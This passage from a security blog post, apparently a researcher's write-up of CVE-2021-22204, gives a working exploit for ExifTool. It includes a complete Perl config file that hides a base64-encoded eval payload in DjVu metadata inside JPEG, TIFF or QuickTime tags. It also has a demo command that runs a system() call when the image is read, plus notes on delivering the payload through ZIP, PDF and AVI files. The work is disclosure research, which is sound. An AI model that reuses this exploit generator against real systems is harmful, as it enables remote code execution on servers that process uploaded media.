TIFF, PNG, JP2, PGF, MIFF, HDP, PSP and XCF images, as well as many
TIFF-based RAW images, and even some AVI and MOV videos.
</code></pre></div></div>

<p>Instead of manually editing the files each time, it would be great if there was a tool designed to edit image metadata. It turns out ExifTool allows you to <a href="https://www.exiftool.org/config.html">create your own tag tables</a> with a config file using <code>Image::ExifTool::UserDefined</code>. After a bit of trial and error I had the following <code>eval.config</code> file:</p>

<div><div><pre><code><span>%</span><span>Image::ExifTool::</span><span>UserDefined</span> <span>=</span> <span>(</span>
    <span>&#39;</span><span>Image::ExifTool::Exif::Main</span><span>&#39;</span> <span>=&gt;</span> <span>{</span>
        <span>0xc51b</span> <span>=&gt;</span> <span>{</span>
            <span>Name</span> <span>=&gt;</span> <span>&#39;</span><span>eval</span><span>&#39;,</span>
            <span>Binary</span> <span>=&gt;</span> <span>1</span><span>,</span>
            <span>Writable</span> <span>=&gt;</span> <span>&#39;</span><span>undef</span><span>&#39;,</span>
            <span>WriteGroup</span> <span>=&gt;</span> <span>&#39;</span><span>IFD0</span><span>&#39;,</span>
            <span>ValueConvInv</span> <span>=&gt;</span> <span>sub </span><span>{</span>
                <span>use</span> <span>MIME::</span><span>Base64</span><span>;</span>
                <span>my</span> <span>$val</span> <span>=</span> <span>shift</span><span>;</span>
                <span>$encoded</span> <span>=</span> <span>encode_base64</span><span>(</span><span>$val</span><span>);</span>
                <span>my</span> <span>$meta</span> <span>=</span> <span>qq/(metadata(Copyright &#34;\\\n&#34; eq &#39;&#39;; return (eval { use MIME::Base64; eval(decode_base64(q%$encoded%)); });#&#34;))/</span><span>;</span>
                <span>my</span> <span>$len</span> <span>=</span> <span>pack</span> <span>&#34;</span><span>N</span><span>&#34;,</span> <span>length</span><span>(</span><span>$meta</span><span>);</span>
                <span>my</span> <span>$payload</span> <span>=</span> <span>qq/AT&amp;TFORM\x00\x00\x00\x08DJVUANTa$len$meta/</span><span>;</span>
                <span>return</span> <span>$payload</span><span>;</span>
            <span>}</span>
        <span>}</span>
    <span>}</span>
<span>)</span>
</code></pre></div></div>

<p>This let you add the <code>HasselbladExif</code> tag to any format that exiftool could write EXIF tags to (eg jpg, tif, png):</p>

<div><div><pre><code>$ exiftool -config eval.config image.jpg -eval=&#39;system(&#34;echo ggg&#34;)&#39;
$ exiftool image.jpg
$ exiftool image.jpg
ggg
ExifTool Version Number         : 11.85
File Name                       : image.jpg
Directory                       : .
File Size                       : 11 kB
</code></pre></div></div>

<h2 id="bonus-formats">Bonus Formats</h2>

<p>Any of the formats that use the tag table <code>Image::ExifTool::Exif::Main</code>, call <code>ExtractInfo</code>, <code>ProcessTIFF</code>, <code>ProcessExif</code>, or process any of the vulnerable formates can most likely be used as well. An incomplete list:</p>

<ul>
  <li>ZIP - <a href="https://github.com/exiftool/exiftool/blob/12.23/lib/Image/ExifTool/ZIP.pm#L599-L600">lib/Image/ExifTool/ZIP.pm#L599-L600</a></li>
</ul>

<p>If a zip file contains <code>meta.json</code> then it will have <code>ExtractInfo</code> called on it.</p>

<div><div><pre><code><span>if</span> <span>(</span><span>$extract</span><span>{</span><span>$file</span><span>})</span> <span>{</span>
    <span>(</span><span>$buff</span><span>,</span> <span>$status</span><span>)</span> <span>=</span> <span>$zip</span><span>-&gt;</span><span>contents</span><span>(</span><span>$member</span><span>);</span>
    <span>$status</span> <span>and</span> <span>$et</span><span>-&gt;</span><span>Warn</span><span>(&#34;</span><span>Error extracting </span><span>$file</span><span>&#34;),</span> <span>next</span><span>;</span>
    <span>if</span> <span>(</span><span>$file</span> <span>eq</span> <span>&#39;</span><span>meta.json</span><span>&#39;)</span> <span>{</span>
        <span>$et</span><span>-&gt;</span><span>ExtractInfo</span><span>(</span><span>\</span><span>$buff</span><span>,</span> <span>{</span> <span>ReEntry</span> <span>=&gt;</span> <span>1</span> <span>});</span>
        <span>if</span> <span>(</span><span>$$et</span><span>{</span><span>VALUE</span><span>}{</span><span>App</span><span>}</span> <span>and</span> <span>$$et</span><span>{</span><span>VALUE</span><span>}{</span><span>App</span><span>}</span> <span>=~</span> <span>/sketch/i</span><span>)</span> <span>{</span>
            <span>$et</span><span>-&gt;</span><span>OverrideFileType</span><span>(&#39;</span><span>SKETCH</span><span>&#39;);</span>
        <span>}</span>
</code></pre></div></div>

<ul>
  <li>PDF - <a href="https://github.com/exiftool/exiftool/blob/12.23/lib/Image/ExifTool/PDF.pm#L2071-L2076">lib/Image/ExifTool/PDF.pm#L2071-L2076</a></li>
</ul>

<p>If a PDF uses the <code>DCTDecode</code> or <code>JPXDecode</code> filters then <code>ExtractInfo</code> will be called on it.</p>

<div><div><pre><code><span>if</span> <span>(</span><span>$filter</span> <span>eq</span> <span>&#39;</span><span>/DCTDecode</span><span>&#39;</span> <span>or</span> <span>$filter</span> <span>eq</span> <span>&#39;</span><span>/JPXDecode</span><span>&#39;)</span> <span>{</span>
    <span>DecodeStream</span><span>(</span><span>$et</span><span>,</span> <span>$dict</span><span>)</span> <span>or</span> <span>last</span><span>;</span>
    <span># save the image itself</span>
    <span>$et</span><span>-&gt;</span><span>FoundTag</span><span>(</span><span>$tagInfo</span><span>,</span> <span>\</span><span>$$dict</span><span>{</span><span>_stream</span><span>});</span>
    <span># extract information from embedded image</span>
    <span>$result</span> <span>=</span> <span>$et</span><span>-&gt;</span><span>ExtractInfo</span><span>(</span><span>\</span><span>$$dict</span><span>{</span><span>_stream</span><span>},</span> <span>{</span> <span>ReEntry</span> <span>=&gt;</span> <span>1</span> <span>});</span>
</code></pre></div></div>

<ul>
  <li>AVI - <a href="https://github.com/exiftool/exiftool/blob/12.23/lib/Image/ExifTool/RIFF.pm#L497-L503">lib/Image/ExifTool/RIFF.pm#L497-L503</a></li>
</ul>

<p>The <code>EXIF</code> tag will be processed as a tiff. ExifTool doesn’t support writing to AVIs, but one of the <code>JUNK</code> tags used for alignment in the AVI could just be replaced with <code>EXIF</code> and a tiff/exif payload.</p>

<div><div><pre><code>    <span>EXIF</span> <span>=&gt;</span> <span>[{</span> <span># (WebP)</span>
        <span>Name</span> <span>=&gt;</span> <span>&#39;</span><span>EXIF</span><span>&#39;,</span>
        <span>Condition</span> <span>=&gt;</span> <span>&#39;</span><span>$$valPt =~ /^(II\x2a\0|MM\0\x2a)/</span><span>&#39;,</span>
        <span>Notes</span> <span>=&gt;</span> <span>&#39;</span><span>WebP files</span><span>&#39;,</span>
        <span>SubDirectory</span> <span>=&gt;</span> <span>{</span>
            <span>TagTable</span> <span>=&gt;</span> <span>&#39;</span><span>Image::ExifTool::Exif::Main</span><span>&#39;,</span>
            <span>ProcessProc</span> <span>=&gt;</span> <span>\</span><span>&amp;</span><span>Image::ExifTool::</span><span>ProcessTIFF</span><span>,</span>
</code></pre></div></div>

<ul>
  <li>MOV/MP4 - <a href="https://github.com/exiftool/exiftool/blob/12.23/lib/Image/ExifTool/QuickTime.pm#L2128-L2132">lib/Image/ExifTool/QuickTime.pm#L2128-L2132</a></li>
</ul>

<p>The <code>UserData</code> tag <code>RMKN</code> will be processed as a tiff which will then its exif data parsed.</p>

<div><div><pre><code>    <span>RMKN</span> <span>=&gt;</span> <span>{</span> <span>#PH (GR)</span>
        <span>Name</span> <span>=&gt;</span> <span>&#39;</span><span>RicohRMKN</span><span>&#39;,</span>
        <span>SubDirectory</span> <span>=&gt;</span> <span>{</span>
            <span>TagTable</span> <span>=&gt;</span> <span>&#39;</span><span>Image::ExifTool::Exif::Main</span><span>&#39;,</span>
            <span>ProcessProc</span> <span>=&gt;</span> <span>\</span><span>&amp;</span><span>Image::ExifTool::</span><span>ProcessTIFF</span><span>,</span> <span># (because ProcessMOV is default)</span>
</code></pre></div></div>

<p>The config file from before can be modified to add support for writing to this tag:</p>

<div><div><pre><code><span>use</span> <span>MIME::</span><span>Base64</span><span>;</span>

<span>sub </span><span>GetDjVu</span> <span>{</span>
    <span>my</span> <span>(</span><span>$val</span><span>)</span> <span>=</span> <span>@_</span><span>;</span>
    <span>$encoded</span> <span>=</span> <span>encode_base64</span><span>(</span><span>$val</span><span>);</span>
    <span>my</span> <span>$meta</span> <span>=</span> <span>qq/(metadata(Copyright &#34;\\\n&#34; eq &#39;&#39;; return (eval { use MIME::Base64; eval(decode_base64(q%$encoded%)); });#&#34;))/</span><span>;</span>
    <span>my</span> <span>$len</span> <span>=</span> <span>pack</span> <span>&#34;</span><span>N</span><span>&#34;,</span> <span>length</span><span>(</span><span>$meta</span><span>);</span>
    <span>my</span> <span>$payload</span> <span>=</span> <span>qq/AT&amp;TFORM\x00\x00\x00\x08DJVUANTa$len$meta/</span><span>;</span>
    <span>return</span> <span>$payload</span><span>;</span>
<span>}</span>

<span>sub </span><span>GetTiff</span> <span>{</span>
    <span>my</span> <span>(</span><span>$val</span><span>)</span> <span>=</span> <span>@_</span><span>;</span>
    <span>my</span> <span>$payload</span> <span>=</span> <span>GetDjVu</span><span>(</span><span>$val</span><span>);</span>
    <span>my</span> <span>$len</span> <span>=</span> <span>pack</span> <span>&#34;</span><span>N</span><span>&#34;,</span> <span>length</span><span>(</span><span>$payload</span><span>)</span> <span>+</span> <span>1</span><span>;</span>
    <span>my</span> <span>$tif</span> <span>=</span>
        <span>&#34;</span><span>MM</span><span>\x00</span><span>*</span><span>\x00\x00\x00\x08\x00\x05\x01\x1a\x00\x05\x00\x00\x00\x01\x00\x00\x00</span><span>J</span><span>\x01\x1b\x00\x05\x00\x00\x00\x01\x00</span><span>&#34;</span> <span>.</span>
        <span>&#34;</span><span>\x00\x00</span><span>R</span><span>\x01</span><span>(</span><span>\x00\x03\x00\x00\x00\x01\x00\x03\x00\x00\x02\x13\x00\x03\x00\x00\x00\x01\x00\x01\x00\x00\xc5\x1b\x00\x07</span><span>&#34;</span> <span>.</span>
        <span>&#34;</span><span>$len</span><span>\x00\x00\x00</span><span>Z</span><span>\x00\x00\x00\x00\x00\x00\x00</span><span>%</span><span>\x00\x00\x00\x01\x00\x00\x00</span><span>%</span><span>\x00\x00\x00\x01</span><span>&#34;</span> <span>.</span>
        <span>&#34;</span><span>$payload</span><span>\x00</span><span>&#34;;</span>
    <span>return</span> <span>$tif</span><span>;</span>
<span>}</span>

<span>%</span><span>Image::ExifTool::</span><span>UserDefined</span> <span>=</span> <span>(</span>
    <span>&#39;</span><span>Image::ExifTool::Exif::Main</span><span>&#39;</span> <span>=&gt;</span> <span>{</span>
        <span>0xc51b</span> <span>=&gt;</span> <span>{</span>
            <span>Name</span> <span>=&gt;</span> <span>&#39;</span><span>eval</span><span>&#39;,</span>
            <span>Binary</span> <span>=&gt;</span> <span>1</span><span>,</span>
            <span>Writable</span> <span>=&gt;</span> <span>&#39;</span><span>undef</span><span>&#39;,</span>
            <span>WriteGroup</span> <span>=&gt;</span> <span>&#39;</span><span>IFD0</span><span>&#39;,</span>
            <span>ValueConvInv</span> <span>=&gt;</span> <span>sub </span><span>{</span>
                <span>return</span> <span>GetDjVu</span><span>(</span><span>shift</span><span>);</span>
            <span>}</span>
        <span>}</span>
    <span>},</span>

    <span>&#39;</span><span>Image::ExifTool::QuickTime::UserData</span><span>&#39;</span> <span>=&gt;</span> <span>{</span>
        <span>&#39;</span><span>RMKN</span><span>&#39;</span> <span>=&gt;</span> <span>{</span>
            <span>Name</span> <span>=&gt;</span> <span>&#39;</span><span>eval</span><span>&#39;,</span>
            <span>Binary</span> <span>=&gt;</span> <span>1</span><span>,</span>
            <span>Writable</span> <span>=&gt;</span> <span>&#39;</span><span>undef</span><span>&#39;,</span>
            <span>ValueConvInv</span> <span>=&gt;</span> <span>sub </span><span>{</span>
                <span>return</span> <span>GetTiff</span><span>(</span><span>shift</span><span>);</span>
            <span>}</span>
        <span>}</span>
    <span>}</span>
<span>)</span>
</code></pre></div></div>

<h2 id="references">References</h2>

<ul>
  <li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22204">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22204</a></li>
  <li><a href="https://hackerone.com/reports/1154542">https://hackerone.com/reports/1154542</a></li>
  <li><a href="https://twitter.com/wcbowling/status/1385803927321415687">@wcbowling/status/138580392732141568</a></li>
  <li><a href="https://exiftool.org/history.html#v12.24">https://exiftool.org/history.html#v12.24</a></li>
</ul>

  </div>

  

  
  
  
  
</article>

    </section>
  </div></div>
  </body>
</html>
